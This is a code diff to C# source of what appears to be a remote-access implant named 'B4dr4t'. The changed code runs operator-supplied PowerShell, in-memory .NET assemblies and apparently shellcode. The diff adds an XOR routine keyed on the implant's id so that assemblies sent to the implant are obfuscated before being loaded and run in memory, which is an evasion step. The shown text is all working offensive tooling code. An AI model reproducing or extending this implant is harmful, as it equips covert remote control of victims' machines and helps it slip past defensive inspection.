@@ -171,6 +171,16 @@ namespace B4dr4t
         }
 
         // By passing in the same Powershell object we share the same Powershell workspace as standard cmd execution
+        private static byte[] Zor(byte[] input, byte[] key)
+        {
+            byte[] mixed = new byte[input.Length];
+            for (int i = 0; i < input.Length; i++)
+            {
+                mixed[i] = (byte)(input[i] ^ key[i % key.Length]);
+            }
+            return mixed;
+        }
+
         private static string RunPs(string encodedScript, PowerShell ps)
         {
             string results = string.Empty;
@@ -192,7 +202,7 @@ namespace B4dr4t
             appDomain.ExecuteAssemblyByName(assembly.FullName, Globl.HOME);
         }
         //Most of this function is copied from C Sharper: https://gitlab.com/KevinJClark/csharper
-        private static string RunAssembly(string encodedAssembly, string argumentString)
+        private static string RunAssembly(byte[] assemblyBytes, string argumentString)
         {
             
             string Delimeter = "\",\""; // split on quote comma quote ( "," )
@@ -210,8 +220,7 @@ namespace B4dr4t
 
             try
             {
-                byte[] data = Convert.FromBase64String(encodedAssembly);
-                assembly = Assembly.Load(data);
+                assembly = Assembly.Load(assemblyBytes);
             }
             catch (Exception e)
             {
@@ -437,7 +446,7 @@ namespace B4dr4t
                                     string b64Assembly = cmnd.Split(' ')[1];
                                     //Cuts off the first two elements of cmnd (cs and <b64assembly>) and returns a string array
                                     string argumentString = string.Join(" ", cmnd.Split(' ').Skip(2).Take(cmnd.Length).ToArray()); //Equiv to args = " ".join(cmnd.split(" ")[2:])
-                                    retval = RunAssembly(b64Assembly, argumentString);
+                                    retval = RunAssembly(Zor(Convert.FromBase64String(b64Assembly), Encoding.UTF8.GetBytes(id)), argumentString);
 
                                 }
                                 else if (cmnd.Split(' ')[0] == "shc")
